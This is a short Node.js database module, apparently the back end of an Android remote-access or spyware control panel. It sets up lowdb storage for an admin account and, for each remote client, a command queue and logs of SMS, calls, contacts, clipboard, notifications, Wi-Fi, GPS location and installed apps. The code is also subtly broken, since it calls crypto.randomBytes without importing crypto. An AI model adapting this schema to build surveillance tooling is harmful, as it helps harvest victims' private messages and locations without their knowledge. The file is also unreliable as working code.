const
    lowdb = require('lowdb'),
    FileSync = require('lowdb/adapters/FileSync'),
    path = require('path'),
    adapter = new FileSync('./maindb.json'),
    db = lowdb(adapter);

db.defaults({
    admin: {
        username: 'admin',
        password: '',
        loginToken: '',
        logs: [],
        ipLog: []
    },
    clients: []
}).write()

class clientdb {
    constructor(clientID) {
        // Sanitize clientID to prevent path traversal
        let safeClientID = (clientID || 'unknown').toString().replace(/[^a-zA-Z0-9_-]/g, '');
        if (safeClientID === '') {
            safeClientID = 'unknown_' + crypto.randomBytes(4).toString('hex');
        }
        let cdb = lowdb(new FileSync('./clientData/' + safeClientID + '.json'))
        cdb.defaults({
            clientID,
            CommandQue: [],
            SMSData: [],
            CallData: [],
            contacts: [],
            wifiNow: [],
            wifiLog: [],
            clipboardLog: [],
            notificationLog: [],
            enabledPermissions: [],
            apps: [],
            GPSData: [],
            GPSSettings: {
                updateFrequency: 0
            },
            downloads: [],
            currentFolder: []
        }).write()
        return cdb;
    }
}

module.exports = {
    maindb: db,
    clientdb: clientdb,
};


